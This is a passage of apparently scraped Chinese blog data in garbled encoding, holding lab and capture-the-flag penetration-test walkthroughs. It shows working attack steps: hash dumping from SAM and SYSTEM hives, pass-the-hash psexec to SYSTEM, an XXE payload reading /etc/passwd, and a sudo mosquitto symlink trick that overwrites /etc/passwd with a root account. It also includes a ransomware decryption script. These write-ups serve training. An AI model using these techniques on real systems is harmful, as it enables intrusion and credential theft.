‡é¢˜ http://172.22.17.213:8080 çŠ¶æ€ç :302 é•¿åº¦:0 æ ‡é¢˜:æ— æ ‡é¢˜ é‡å®šå‘åœ°å€: http://172.22.17.213:8080/login;jsessionid=AE53E4C807EB6DEB9B204E7B4201FDFF[2025-05-02 11:24:28] [SUCCESS] åŒ¿åç™»å½•æˆåŠŸ![2025-05-02 11:24:28] [SUCCESS] ç½‘ç«™æ ‡é¢˜ http://172.22.17.213:8080/login;jsessionid=AE53E4C807EB6DEB9B204E7B4201FDFF çŠ¶ æ€ç :200 é•¿åº¦:2936 æ ‡é¢˜:ç«åˆ›èƒ½æºç›‘æ§ç”»é¢ç®¡ç†å¹³å°[2025-05-02 11:24:29] [SUCCESS] ç›®æ ‡: http://172.22.17.213:8080 æ¼æ´ç±»å‹: poc-yaml-spring-actuator-heapdump-file æ¼æ´åç§°: è¯¦ç»†ä¿¡æ¯: author:AgeloVito links:https://www.cnblogs.com/wyb628/p/8567610.html[2025-05-02 11:24:30] [SUCCESS] ç›®æ ‡: http://172.22.17.213:8080 æ¼æ´ç±»å‹: poc-yaml-springboot-env-unauth æ¼æ´åç§°: spring2 è¯¦ç»†ä¿¡æ¯: links:https://github.com/LandGrey/SpringBootVulExploit 12345[2025-05-02 11:23:23] [SUCCESS] ç«¯å£å¼€æ”¾ 172.22.17.6:445[2025-05-02 11:23:23] [SUCCESS] ç«¯å£å¼€æ”¾ 172.22.17.6:139[2025-05-02 11:23:23] [SUCCESS] ç«¯å£å¼€æ”¾ 172.22.17.6:135[2025-05-02 11:23:23] [SUCCESS] ç«¯å£å¼€æ”¾ 172.22.17.6:21[2025-05-02 11:23:23] [SUCCESS] ç«¯å£å¼€æ”¾ 172.22.17.6:80 å…ˆçœ‹ftpï¼Œå¯ä»¥åŒ¿åç™»é™†ä½†æ˜¯ä¸­æ–‡ä¼šä¹±ç ï¼Œå’Œ80ç«¯å£çš„æ–‡ä»¶æ˜¯ä¸€æ ·çš„ï¼Œéšä¾¿åœ¨ä¸€ä¸ªæœåŠ¡ä¸‹è½½å°±è¡Œ å†…éƒ¨é€šçŸ¥.docxå‘Šè¯‰æˆ‘ä»¬äº†å¯†ç è§„åˆ™ 12ç™»é™†è´¦æˆ·è®¾ç½®ï¼š ä¸ºæ–¹ä¾¿ç®¡ç†å’Œæ ‡å‡†åŒ–ï¼Œç™»é™†è´¦æˆ·åå°†é‡‡ç”¨å§“åå…¨ç§°çš„å°å†™æ‹¼éŸ³å½¢å¼ã€‚ä¾‹å¦‚ï¼Œå¼ ä¸‰çš„è´¦æˆ·åä¸ºzhangsanï¼Œå·¥å·ä¸º0801ã€‚åˆå§‹å¯†ç å°†ç”±è´¦æˆ·å+@+å·¥å·ç»„æˆï¼Œä¾‹å¦‚ï¼Œzhangsan@0801ã€‚ è¿˜å­˜åœ¨ä¸€ä¸ªé€šè®¯å½•ï¼Œæ ¹æ®é€šè®¯å½•é‡Œçš„ä¿¡æ¯å’Œè¿™ä¸ªå¯†ç è§„åˆ™å¯ä»¥æ„é€ ï¼Œæœ‰å¥½å¤šè´¦å·éƒ½å¯ä»¥ç™»é™†ï¼Œä»»æ„ä¸€ä¸ªå°±å¯ä»¥ 1chenhua/chenhua@0813 rdpè¿æ¥ï¼Œscad.txtè¿˜ç»™äº†ä¸€ä¸ªç®¡ç†å‘˜çš„å¯†ç  123WIN-SCADA: 172.22.26.xxUsername: AdministratorPassword: IYnT3GyCiy3 ä½†æ˜¯è¿™ä¸æ˜¯è¿™å°ä¸»æœºçš„ç®¡ç†å‘˜å¯†ç ï¼Œé¢˜ç›®æç¤º 12å…³å¡å‰§æƒ…ï¼šå°è¯•æ¥ç®¡ SCADA å·¥ç¨‹å¸ˆçš„ä¸ªäºº PCï¼Œå¹¶é€šè¿‡æ»¥ç”¨ Windows ç‰¹æƒç»„æå‡è‡³ç³»ç»Ÿæƒé™ã€‚ æŸ¥çœ‹å½“å‰ç”¨æˆ·ç»„ 12345678910111213141516171819202122232425262728C:\\Users\\chenhua&gt;net user chenhuaç”¨æˆ·å chenhuaå…¨åæ³¨é‡Šç”¨æˆ·çš„æ³¨é‡Šå›½å®¶/åœ°åŒºä»£ç  000 (ç³»ç»Ÿé»˜è®¤å€¼)å¸æˆ·å¯ç”¨ Yeså¸æˆ·åˆ°æœŸ ä»ä¸ä¸Šæ¬¡è®¾ç½®å¯†ç  2023/12/26 0:47:03å¯†ç åˆ°æœŸ ä»ä¸å¯†ç å¯æ›´æ”¹ 2023/12/26 0:47:03éœ€è¦å¯†ç  Yesç”¨æˆ·å¯ä»¥æ›´æ”¹å¯†ç  Yeså…è®¸çš„å·¥ä½œç«™ Allç™»å½•è„šæœ¬ç”¨æˆ·é…ç½®æ–‡ä»¶ä¸»ç›®å½•ä¸Šæ¬¡ç™»å½• 2025/5/2 11:36:30å¯å…è®¸çš„ç™»å½•å°æ—¶æ•° Allæœ¬åœ°ç»„æˆå‘˜ *Backup Operators *Remote Desktop Users *Userså…¨å±€ç»„æˆå‘˜ *Noneå‘½ä»¤æˆåŠŸå®Œæˆã€‚ æˆ‘ä»¬åœ¨Backup Operatorsç»„å†…ï¼Œä½†æ˜¯æ²¡ç»™ç”¨æˆ·åˆ†é…SeBackupç‰¹æƒï¼Œå¯ä»¥ç”¨æ³¨å†Œè¡¨ SAM è½¬å‚¨ææƒï¼Œç›´æ¥è½¬å‚¨ sam å’Œ system 1234PS C:\\users\\chenhua\\Desktop&gt; reg save hklm\\sam sam.hiveæ“ä½œæˆåŠŸå®Œæˆã€‚PS C:\\users\\chenhua\\Desktop&gt; reg save hklm\\system system.hiveæ“ä½œæˆåŠŸå®Œæˆã€‚ ç„¶åç”¨secretsdumpå¯¼å‡ºhash 1234567891011121314Administrator:500:aad3b435b51404eeaad3b435b51404ee:f82292b7ac79b05d5b0e3d302bd0d279:::Guest:501:aad3b435b51404eeaad3b435b51404ee:31d6cfe0d16ae931b73c59d7e0c089c0:::DefaultAccount:503:aad3b435b51404eeaad3b435b51404ee:31d6cfe0d16ae931b73c59d7e0c089c0:::WDAGUtilityAccount:504:aad3b435b51404eeaad3b435b51404ee:a2fa2853651307ab9936cc95c0e0acf5:::chentao:1000:aad3b435b51404eeaad3b435b51404ee:47466010c82da0b75328192959da3658:::zhaoli:1001:aad3b435b51404eeaad3b435b51404ee:2b83822caab67ef07b614d05fd72e215:::wangning:1002:aad3b435b51404eeaad3b435b51404ee:3c52d89c176321511ec686d6c05770e3:::zhangling:1003:aad3b435b51404eeaad3b435b51404ee:8349a4c5dd1bdcbc5a14333dd13d9f81:::zhangying:1004:aad3b435b51404eeaad3b435b51404ee:8497fa5480a163cb7817f23a8525be7d:::lilong:1005:aad3b435b51404eeaad3b435b51404ee:c3612c48cf829d1149f7a4e3ef4acb8a:::liyumei:1006:aad3b435b51404eeaad3b435b51404ee:63ddcde0fa219c75e48e2cba6ea8c471:::wangzhiqiang:1007:aad3b435b51404eeaad3b435b51404ee:5a661f54da156dc93a5b546ea143ea07:::zhouyong:1008:aad3b435b51404eeaad3b435b51404ee:5d49bf647380720b9f6a15dbc3ffe432:::chenhua:1009:aad3b435b51404eeaad3b435b51404ee:07ff24422b538b97f3c297cc8ddc7615::: 123456789101112131415161718192021222324â”Œâ”€â”€(rootã‰¿kali)-[~/Desktop/tmp/tmp]â””â”€# impacket-psexec -hashes aad3b435b51404eeaad3b435b51404ee:f82292b7ac79b05d5b0e3d302bd0d279 Administrator@172.22.17.6Impacket v0.9.24 - Copyright 2021 SecureAuth Corporation[*] Requesting shares on 172.22.17.6.....[*] Found writable share ADMIN$[*] Uploading file odkqcbIH.exe[*] Opening SVCManager on 172.22.17.6.....[*] Creating service CFcL on 172.22.17.6.....[*] Starting service CFcL.....[!] Press help for extra shell commands[-] Decoding error detected, consider running chcp.com at the target,map the result with https://docs.python.org/3/library/codecs.html#standard-encodingsand then execute smbexec.py again with -codec and the corresponding codecMicrosoft Windows [ï¿½æ±¾ 10.0.20348.2113][-] Decoding error detected, consider running chcp.com at the target,map the result with https://docs.python.org/3/library/codecs.html#standard-encodingsand then execute smbexec.py again with -codec and the corresponding codec(c) Microsoft Corporationï¿½ï¿½ï¿½ï¿½ï¿½ï¿½ï¿½ï¿½ï¿½ï¿½È¨ï¿½ï¿½ï¿½ï¿½C:\\Windows\\system32&gt; type C:\\Users\\Administrator\\flag\\flag02.txt FLAG03ä¹‹å‰ç»™çš„æ’ä¸Šç”¨åœºäº†ï¼Œç”¨fscanæ‰«ä¸€ä¸‹ 123WIN-SCADA: 172.22.26.xxUsername: AdministratorPassword: IYnT3GyCiy3 1234567891011121314151617181920212223242526272829root@security:~# ./fscan2 -h 172.22.26.1/24â”Œâ”€â”€â”€â”€â”€â”€â”€â”€â”€â”€â”€â”€â”€â”€â”€â”€â”€â”€â”€â”€â”€â”€â”€â”€â”€â”€â”€â”€â”€â”€â”€â”€â”€â”€â”€â”€â”€â”€â”€â”€â”€â”€â”€â”€â”€â”€â”â”‚ ___ _ â”‚â”‚ / _ \\ ___ ___ _ __ __ _ ___| | __ â”‚â”‚ / /_\\/____/ __|/ __| &#x27;__/ _` |/ __| |/ / â”‚â”‚ / /_\\\\_____\\__ \\ (__| | | (_| | (__| &lt; â”‚â”‚ \\____/ |___/\\___|_| \\__,_|\\___|_|\\_\\ â”‚â””â”€â”€â”€â”€â”€â”€â”€â”€â”€â”€â”€â”€â”€â”€â”€â”€â”€â”€â”€â”€â”€â”€â”€â”€â”€â”€â”€â”€â”€â”€â”€â”€â”€â”€â”€â”€â”€â”€â”€â”€â”€â”€â”€â”€â”€â”€â”˜ Fscan Version: 2.0.0[2025-05-02 12:42:59] [INFO] æš´åŠ›ç ´è§£çº¿ç¨‹æ•°: 1[2025-05-02 12:42:59] [INFO] å¼€å§‹ä¿¡æ¯æ‰«æ[2025-05-02 12:42:59] [INFO] CIDRèŒƒå›´: 172.22.26.0-172.22.26.255[2025-05-02 12:42:59] [INFO] ç”ŸæˆIPèŒƒå›´: 172.22.26.0.%!d(string=172.22.26.255) - %!s(MISSING).%!d(MISSING)[2025-05-02 12:42:59] [INFO] è§£æCIDR 172.22.26.1/24 -&gt; IPèŒƒå›´ 172.22.26.0-172.22.26.255[2025-05-02 12:42:59] [INFO] æœ€ç»ˆæœ‰æ•ˆä¸»æœºæ•°é‡: 256[2025-05-02 12:42:59] [INFO] å¼€å§‹ä¸»æœºæ‰«æ[2025-05-02 12:42:59] [SUCCESS] ç›®æ ‡ 172.22.26.11 å­˜æ´» (ICMP)[2025-05-02 12:43:02] [INFO] å­˜æ´»ä¸»æœºæ•°é‡: 1[2025-05-02 12:43:02] [INFO] æœ‰æ•ˆç«¯å£æ•°é‡: 233[2025-05-02 12:43:02] [SUCCESS] ç«¯å£å¼€æ”¾ 172.22.26.11:135[2025-05-02 12:43:02] [SUCCESS] ç«¯å£å¼€æ”¾ 172.22.26.11:139[2025-05-02 12:43:02] [SUCCESS] ç«¯å£å¼€æ”¾ 172.22.26.11:80[2025-05-02 12:43:02] [SUCCESS] ç«¯å£å¼€æ”¾ 172.22.26.11:1433[2025-05-02 12:43:02] [SUCCESS] ç«¯å£å¼€æ”¾ 172.22.26.11:445[2025-05-02 12:43:07] [SUCCESS] æœåŠ¡è¯†åˆ« 172.22.26.11:139 =&gt; Banner:[.][2025-05-02 12:43:07] [SUCCESS] æœåŠ¡è¯†åˆ« 172.22.26.11:1433 =&gt; [ms-sql-s] ç‰ˆæœ¬:13.00.4001; SP1 äº§å“:Microsoft SQL Server 2016 ç³»ç»Ÿ:Windows Banner:[.%.][2025-05-02 12:43:07] [SUCCESS] æœåŠ¡è¯†åˆ« 172.22.26.11:445 =&gt;[2025-05-02 12:43:08] [SUCCESS] æœåŠ¡è¯†åˆ« 172.22.26.11:80 =&gt; [http] è¿œç¨‹æ¡Œé¢è¿æ¥ï¼Œç™»é™†åä¼šè‡ªåŠ¨å¯åŠ¨è½¯ä»¶ï¼Œç„¶åå¼€å¯é”…ç‚‰å¾—åˆ°flag FLAG04æ¡Œé¢ä¸Šæœ‰ä¸€ä¸ªè§£å¯†ä½ çš„æ–‡ä»¶.txt 12345678910111213141516171819202122232425** æ‚¨çš„æ–‡ä»¶å·²è¢«åŠ å¯† **å¾ˆæŠ±æ­‰ï¼Œæ‚¨çš„è®¡ç®—æœºä¸­çš„æ–‡ä»¶å·²è¢«åŠ å¯†ã€‚è¦è§£é”æ‚¨çš„æ–‡ä»¶ï¼Œæ‚¨éœ€è¦æ”¯ä»˜èµé‡‘ã€‚-----------------------------------------| æ³¨æ„äº‹é¡¹ |-----------------------------------------| 1. ä¸è¦è¯•å›¾åˆ é™¤æˆ–ä¿®æ”¹åŠ å¯†æ–‡ä»¶ã€‚ || 2. æ”¯ä»˜èµé‡‘å‰ï¼Œä¸è¦å°è¯•æ¢å¤æ–‡ä»¶ã€‚ || 3. è¯·åœ¨è§„å®šæ—¶é—´å†…æ”¯ä»˜èµé‡‘ã€‚ |-----------------------------------------è¦è·å–è§£å¯†å¯†é’¥å’Œè¿›ä¸€æ­¥çš„è¯´æ˜ï¼Œè¯·è®¿é—®æˆ‘ä»¬çš„æ”¯ä»˜ç½‘ç«™ï¼š[æ”¯ä»˜ç½‘ç«™é“¾æ¥]å¦‚æœæ— æ³•è®¿é—®æ”¯ä»˜ç½‘ç«™ï¼Œè¯·é€šè¿‡ç”µå­é‚®ä»¶è”ç³»æˆ‘ä»¬ï¼šcontact@ransomware.comèµé‡‘é‡‘é¢ï¼š2æ¯”ç‰¹å¸-----------------------------------------| è­¦å‘Šï¼šå°è¯•æ¢å¤æ–‡ä»¶æˆ–æŠ¥è­¦å°†å¯¼è‡´æ°¸ä¹…ä¸¢å¤±æ–‡ä»¶ã€‚|-----------------------------------------æ¯”ç‰¹å¸æ”¯ä»˜åœ°å€ï¼š1ABcDefGhijxLxnxpxrsxUvwxYZabcdEf æ¡Œé¢ä¸Šè¿˜ç»™äº†ä¸¤ä¸ª.lockæ–‡ä»¶ï¼Œé™„ä»¶è¿˜ç»™äº†ä¸¤ä¸ªkeyï¼Œcç›˜è¿˜æœ‰ä¸€ä¸ªLockyou.exe ç”¨dnSpyåç¼–è¯‘å¯ä»¥çœ‹åˆ°åŠ å¯†é€»è¾‘æ ¹æ® locky å‹’ç´¢è½¯ä»¶å®¶æ—åŠ è§£å¯†é€»è¾‘å’Œ .NET é€†å‘ä»£ç ï¼Œè§£å¯†æ€è·¯å¦‚ä¸‹ï¼š é¦–å…ˆç”¨ privateKey å¯¹åŠ å¯†çš„ encryptedAesKeyè¿›è¡Œ RSA è§£å¯†ï¼Œå¾—åˆ° AES_KEYã€‚ å†ç”¨ AES_KEY å¯¹åŠ å¯†çš„æ–‡ä»¶ ScadaDB.sql.locky è§£å¯†ï¼Œå¾—åˆ° ScadaDB.sql é€šè¿‡å·¥å…·ï¼Œå°† privateKey ä» XML æ ¼å¼è½¬æ¢ä¸º PEM æ ¼å¼ï¼Œå¾—åˆ° PRIVATE_KEYï¼š é€šè¿‡å·¥å…·ï¼Œå°† privateKey ä» XML æ ¼å¼è½¬æ¢ä¸º PEM æ ¼å¼ï¼Œå¾—åˆ° PRIVATE_KEYï¼š 12345678910111213141516-----BEGIN PRIVATE KEY-----MIICdwIBADANBgkqhkiG9w0BAQEFAASCAmEwggJdAgEAAoGBALqC9ggGlbTFae2+PyH3HsdgK7brtrb7QTtuSXTMAJ3ruoBDwq0Lw8rMHm3IQNS51d3vjiVeZB8RU6f3YiM0p5p4VJn2Y2K7IWUixptX08HEay+mGFbH1WRv+FC0g1EXwIocjdRyCz/1qgqrrtaFqNAncaMDLGaTAz6Hasx3BQsRAgMBAAECgYEAtuLJ687BJ5RYraZac6zFQo178A8siDrRmTwozV1o0XGf3DwVfefGYmpLAC1X3QAoxUosoVnwZUJxPIfodEsieDoxRqVxMCcKbJK3nwMdAKov6BpxGUloALlxTi6OImT6w/roTW9OK6vlF54o5U/4DnQNUM6ss/2/CMM/EgM9vz0CQQDZE+pqh9wn+mEindAUITKLSSPQVlFCaZaaICaD8LQzJ5fbnmZ6PwiyDS/Cz080/dEsuPbk7Wlsgn5+rBZ9QSYXAkEA2/QGgIpqpxODaJLQvjS8xnU8NvxMlk110LSUnfAh/E6wB/XUc89HhWMqh4sGo/LAX0n94dcZ4vLMpzbkVfy5FwJBALpSudaOno1B/7XytvNQO04KjU75h+31K2tHRUfihwmRZmr/Xv52tEP/xYr03guiALTeXizJCsA0kdawZu1DyikCQDztieeNcCG77AjJsn0dyrUGwJlSpjx0VJBtlUVywVdMzMJHvIQgBOXUJHHLdxlvIw7CRkuK9CbDryEauYGAMh0CQCUtrbQdFiZttt6ZYSUK1qkr7PS3RHk3fHIDVqMk5DDpGCInkU0ZKP0bl7n4MaaZeGy/UUUyPHvLZB6D8zSyuGw=-----END PRIVATE KEY----- å¯ä»¥è§£å‡ºkeyæ˜¯ï¼š 1cli9gqXpTrm7CPMcdP9TSmVSzXVgSb3jrW+AakS7azk= ä½¿ç”¨ AES KEY å¯¹æ–‡ä»¶ ScadaDB.sql.locky è¿›è¡Œè§£å¯†ã€‚RSA + AES è§£å¯†çš„å®Œæ•´è„šæœ¬å¦‚ä¸‹ï¼š 123456789101112131415161718192021222324252627282930313233343536373839404142434445464748495051525354555657585960616263646566676869707172737475# -*- coding: utf-8 -*-# @Author : iker# @Time : 2024/03/04 16:10# @Function: RSA Privatekey Decryption &amp; AES CBC Decryptionimport base64from Crypto.Util.Padding import padfrom Crypto.Cipher import AESfrom Crypto.PublicKey import RSAfrom Crypto.Cipher import PKCS1_v1_5 as Cipher_pkcs1_v1_5def rsa_decrypt(data): private_key = &quot;&quot;&quot;-----BEGIN PRIVATE KEY-----MIICdwIBADANBgkqhkiG9w0BAQEFAASCAmEwggJdAgEAAoGBALqC9ggGlbTFae2+PyH3HsdgK7brtrb7QTtuSXTMAJ3ruoBDwq0Lw8rMHm3IQNS51d3vjiVeZB8RU6f3YiM0p5p4VJn2Y2K7IWUixptX08HEay+mGFbH1WRv+FC0g1EXwIocjdRyCz/1qgqrrtaFqNAncaMDLGaTAz6Hasx3BQsRAgMBAAECgYEAtuLJ687BJ5RYraZac6zFQo178A8siDrRmTwozV1o0XGf3DwVfefGYmpLAC1X3QAoxUosoVnwZUJxPIfodEsieDoxRqVxMCcKbJK3nwMdAKov6BpxGUloALlxTi6OImT6w/roTW9OK6vlF54o5U/4DnQNUM6ss/2/CMM/EgM9vz0CQQDZE+pqh9wn+mEindAUITKLSSPQVlFCaZaaICaD8LQzJ5fbnmZ6PwiyDS/Cz080/dEsuPbk7Wlsgn5+rBZ9QSYXAkEA2/QGgIpqpxODaJLQvjS8xnU8NvxMlk110LSUnfAh/E6wB/XUc89HhWMqh4sGo/LAX0n94dcZ4vLMpzbkVfy5FwJBALpSudaOno1B/7XytvNQO04KjU75h+31K2tHRUfihwmRZmr/Xv52tEP/xYr03guiALTeXizJCsA0kdawZu1DyikCQDztieeNcCG77AjJsn0dyrUGwJlSpjx0VJBtlUVywVdMzMJHvIQgBOXUJHHLdxlvIw7CRkuK9CbDryEauYGAMh0CQCUtrbQdFiZttt6ZYSUK1qkr7PS3RHk3fHIDVqMk5DDpGCInkU0ZKP0bl7n4MaaZeGy/UUUyPHvLZB6D8zSyuGw=-----END PRIVATE KEY-----&quot;&quot;&quot; data = base64.b64decode(data) priobj = Cipher_pkcs1_v1_5.new(RSA.importKey(private_key)) decrypted_data = priobj.decrypt(data,None) return decrypted_datadef padding(data): # style(string) â€“ Padding algorithm.It can be â€˜pkcs7â€™ (default), â€˜iso7816â€™ or â€˜x923â€™. if len(data) % AES.block_size != 0: return pad(data, AES.block_size, &#x27;pkcs7&#x27;) else: return datadef aes_cbc_encrypt(iv, key, data): key = padding(key) data = padding(data) iv = padding(iv) aes = AES.new(key, AES.MODE_CBC, iv) cipher_data = aes.encrypt(data) return cipher_datadef aes_cbc_decrypt(iv, key, data): iv = padding(iv) key = padding(key) data = padding(data) aes = AES.new(key, AES.MODE_CBC, iv) data = aes.decrypt(data) return datadef decrypt_file(encrypted_filepath,output_filepath,key): with open(encrypted_filepath, &#x27;rb&#x27;) as f: data = f.read() iv = b&#x27;\\x00&#x27; * 16 decryption_result = aes_cbc_decrypt(iv, key, data) with open(output_filepath, &#x27;wb&#x27;) as f: f.write(decryption_result)if __name__ == &quot;__main__&quot;: encryptedAesKey = &quot;lFmBs4qEhrqJJDIZ6PXvOyckwF/sqPUXzMM/IzLM/MHu9UhAB3rW/XBBoVxRmmASQEKrmFZLxliXq789vTX5AYNFcvKlwF6+Y7vkeKMOANMczPWT8UU5UcGi6PQLsgkP3m+Q26ZD9vKRkVM5964hJLVzogAUHoyC8bUAwDoNc7g=&quot; key = rsa_decrypt(encryptedAesKey) encrypted_filepath = &quot;ScadaDB.sql.locky&quot; output_filepath = &quot;ScadaDB.sql&quot; decrypt_file(encrypted_filepath,output_filepath,key) è¿è¡Œè§£å¯†å‡ºScadaDB.sql,flag4åœ¨æ•°æ®åº“é‡Œ","categories":[{"name":"æ˜¥ç§‹äº‘é•œ","slug":"æ˜¥ç§‹äº‘é•œ","permalink":"https://lvzhouhang.xyz/categories/%E6%98%A5%E7%A7%8B%E4%BA%91%E9%95%9C/"}],"tags":[{"name":"é¶æœº","slug":"é¶æœº","permalink":"https://lvzhouhang.xyz/tags/%E9%9D%B6%E6%9C%BA/"}]},{"title":"ç¾¤å‹æœº-Bamuwe","slug":"ç¾¤å‹é¶æœº-Bamuwe","date":"2025-04-30T07:44:22.000Z","updated":"2025-05-05T05:06:41.167Z","comments":true,"path":"2025/04/30/ç¾¤å‹é¶æœº-Bamuwe/","permalink":"https://lvzhouhang.xyz/2025/04/30/%E7%BE%A4%E5%8F%8B%E9%9D%B6%E6%9C%BA-Bamuwe/","excerpt":"","text":"ä¿¡æ¯æœé›†12345678910â”Œâ”€â”€(rootã‰¿kali)-[~/Desktop/tmp]â””â”€# arp-scan -lInterface: eth0, type: EN10MB, MAC: 00:0c:29:ff:66:80, IPv4: 192.168.31.129Starting arp-scan 1.10.0 with 256 hosts (https://github.com/royhills/arp-scan)192.168.31.1 0a:00:27:00:00:11 (Unknown: locally administered)192.168.31.2 08:00:27:38:e9:13 PCS Systemtechnik GmbH192.168.31.171 08:00:27:59:20:9a PCS Systemtechnik GmbH3 packets received by filter, 0 packets dropped by kernelEnding arp-scan 1.10.0: 256 hosts scanned in 2.396 seconds (106.84 hosts/sec). 3 responded 123456789101112â”Œâ”€â”€(rootã‰¿kali)-[~/Desktop/tmp]â””â”€# nmap 192.168.31.171Starting Nmap 7.95 ( https://nmap.org ) at 2025-04-30 03:50 EDTNmap scan report for 192.168.31.171Host is up (0.0017s latency).Not shown: 998 closed tcp ports (reset)PORT STATE SERVICE22/tcp open ssh80/tcp open httpMAC Address: 08:00:27:59:20:9A (PCS Systemtechnik/Oracle VirtualBox virtual NIC)Nmap done: 1 IP address (1 host up) scanned in 6.80 seconds 80ç«¯å£å‰ç«¯æœ‰ä¸€æ®µæ³¨é‡Š 123456789&lt;!-- XML STRUCTURE EXAMPLE --&gt;&lt;!--&lt;user&gt; &lt;name&gt;John Doe&lt;/name&gt; &lt;tel&gt;123-4567890&lt;/tel&gt; &lt;email&gt;admin@admin.com&lt;/email&gt; &lt;password&gt;secret123&lt;/password&gt;&lt;/user&gt;--&gt; å¾ˆæ˜æ˜¾çš„xxeæç¤º 123456789&lt;?xml version=&quot;1.0&quot;?&gt;&lt;!DOCTYPE foo [ &lt;!ENTITY xxe SYSTEM &quot;file:///etc/passwd&quot;&gt;]&gt; &lt;user&gt; &lt;name&gt;John Doe&lt;/name&gt; &lt;tel&gt;123-4567890&lt;/tel&gt; &lt;email&gt;&amp;xxe;&lt;/email&gt; &lt;password&gt;secret123&lt;/password&gt; &lt;/user&gt; å¯ä»¥è¯»å–åˆ°æ–‡ä»¶ï¼ŒçŸ¥é“æœ‰ä¸€ä¸ªwelcomeç”¨æˆ·ï¼Œå¯ä»¥ç›´æ¥è¯»å–user.txt ææƒè¯»å–/home/welcome/.viminfoï¼Œä»–å‘Šè¯‰ä½ è¦å»è¯»å–pass.txt,pass.txté‡Œå‘Šè¯‰äº†welcomeçš„å¯†ç ï¼Œsshç™»å½• 123456welcome@Bamuwe:~$ sudo -lMatching Defaults entries for welcome on Bamuwe: env_reset, mail_badpass, secure_path=/usr/local/sbin\\:/usr/local/bin\\:/usr/sbin\\:/usr/bin\\:/sbin\\:/binUser welcome may run the following commands on Bamuwe: (ALL) NOPASSWD: /opt/sub.sh 12welcome@Bamuwe:~$ cat /opt/sub.sh/usr/bin/mosquitto_sub &quot;$@&quot; &gt; /home/welcome/sub.log mosquittoæ˜¯ä¸€ä¸ªæ¶ˆæ¯ä»£ç†è½¯ä»¶mosquitto_subæ˜¯ç”¨æ¥è®¢é˜…çš„ï¼Œå¯¹åº”çš„æ˜¯ mosquitto_pub å‚è€ƒè¿æ¥ åœ¨kaliä¸Šä¿®æ”¹mosquittoçš„é…ç½®æ–‡ä»¶ 12â”Œâ”€â”€(rootã‰¿kali)-[~/Desktop/tmp]â””â”€# vim /etc/mosquitto/mosquitto.conf æ·»åŠ  1234listener 1883bind_address 0.0.0.0allow_anonymous truepassword_file /etc/mosquitto/pwflie.example ç„¶åå¯åŠ¨æœåŠ¡ 12345678910â”Œâ”€â”€(rootã‰¿kali)-[~/Desktop/tmp]â””â”€# mosquitto1746003305: mosquitto version 2.0.21 starting1746003305: Using default config.1746003305: Starting in local only mode. Connections will only be possible from clients running on this machine.1746003305: Create a configuration file which defines a listener to allow remote access.1746003305: For more details see https://mosquitto.org/documentation/authentication-methods/1746003305: Opening ipv4 listen socket on port 1883.1746003305: Opening ipv6 listen socket on port 1883.1746003305: mosquitto version 2.0.21 running å¦‚æœç«¯å£æ²¡æœ‰ç›‘å¬0.0.0.0çš„è¯å¯ä»¥ç”¨socatå°†1883è½¬å‘å‡ºæ¥ ç„¶åå†welcomeçš„å®¶ç›®å½•åˆ›å»ºä¸€ä¸ªè½¯è¿æ¥ï¼ŒæŒ‡å‘/etc/passwd 1welcome@Bamuwe:~$ ln -sf /etc/passwd sub.log å°†é¶æœºé‡Œçš„/etc/passwdæ–‡ä»¶å¤åˆ¶ä¸€ä»½ï¼Œæ·»åŠ ä¸€æ¡ç”¨æˆ·ä¿¡æ¯ 1ll:$1$Zg12rJZk$P7IV1RqAT005RKjprDSo41:0:0:root:/root:/bin/bash 1234â”Œâ”€â”€(rootã‰¿kali)-[~/Desktop/tmp]â””â”€# mosquitto_pub -t test -f passwdwelcome@Bamuwe:~$ sudo /opt/sub.sh -h 192.168.31.129 -p 1884 -t test ç„¶å/etc/passwdå°±è¢«è¦†ç›–äº† 1welcome@Bamuwe:~$ su - ll å¯†ç æ˜¯123123 ææƒæˆåŠŸ","categories":[{"name":"660930334","slug":"660930334","permalink":"https://lvzhouhang.xyz/categories/660930334/"}],"tags":[{"name":"é¶æœº","slug":"é¶æœº","permalink":"https://lvzhouhang.xyz/tags/%E9%9D%B6%E6%9C%BA/"}]},{"title":"ç¾¤å‹æœº-Kakeru","slug":"ç¾¤å‹é¶æœº-Kakeru","date":"2025-04-29T06:00:01.000Z","updated":"2025-04-30T09:48:07.115Z","comments":true,"path":"2025/04/29/ç¾¤å‹é¶æœº-Kakeru/","permalink":"https://lvzhouhang.xyz/2025/04/29/%E7%BE%A4%E5%8F%8B%E9%9D%B6%E6%9C%BA-Kakeru/","excerpt":"","text":"ä¿¡æ¯æœé›†1234567â”Œâ”€â”€(rootã‰¿kali)-[~/Desktop/tmp]â””â”€# arp-scan -lInterface: eth0, type: EN10MB, MAC: 00:0c:29:ff:66:80, IPv4: 192.168.31.129Starting arp-scan 1.10.0 with 256 hosts (https://github.com/royhills/arp-scan)192.168.31.1 0a:00:27:00:00:11 (Unknown: locally administered)192.168.31.2 08:00:27:8f:69:69 PCS Systemtechnik GmbH192.168.31.170 08:00:27:bf:56:1c PCS Systemtechnik GmbH 192.168.31.170å°±æ˜¯é¶æœºipåœ°å€ 123456789101112â”Œâ”€â”€(rootã‰¿kali)-[~/Desktop/tmp]â””â”€# nmap 192.168.31.170 -p-Starting Nmap 7.95 ( https://nmap.org ) at 2025-04-29 02:02 EDTNmap scan report for 192.168.31.170Host is up (0.0026s latency).Not shown: 65533 closed tcp ports (reset)PORT STATE SERVICE22/tcp open ssh80/tcp open httpMAC Address: 08:00:27:BF:56:1C (PCS Systemtechnik/Oracle VirtualBox virtual NIC)Nmap done: 1 IP address (1 host up) scanned in 13.22 seconds 80ç«¯å£123456789101112131415161718192021 &lt;title&gt;User welcome&#x27;s password is here.&lt;/title&gt; POST /login HTTP/1.1Host: 192.168.3.132User-Agent: Mozilla/5.0 (Macintosh; Intel Mac OS X 10.15; rv:137.0) Gecko/20100101 Firefox/137.0Accept: text/html,application/xhtml+xml,application/xml;q=0.9,*/*;q=0.8Accept-Language: zh-CN,zh;q=0.8,zh-TW;q=0.7,zh-HK;q=0.5,en-US;q=0.3,en;q=0.2Accept-Encoding: gzip, deflate, brContent-Type: application/x-www-form-urlencodedContent-Length: 31Origin: http://192.168.3.132Connection: keep-aliveReferer: http://192.168.3.132/Cookie: PHPSESSID=eiag23f4enj5tfcpl7t1qhhk2tUpgrade-Insecure-Requests: 1Priority: u=0, iusername=admin&amp;amp;password=admin(&lt;=x-).+(?=en) æœ‰ç”¨çš„ä¿¡æ¯å°±æ˜¯è¿™äº›ï¼Œä»è¿™å¯ä»¥å¾—çŸ¥å­˜åœ¨welcomeç”¨æˆ·ï¼Œç„¶åå‘Šè¯‰æˆ‘ä»¬å¯†ç 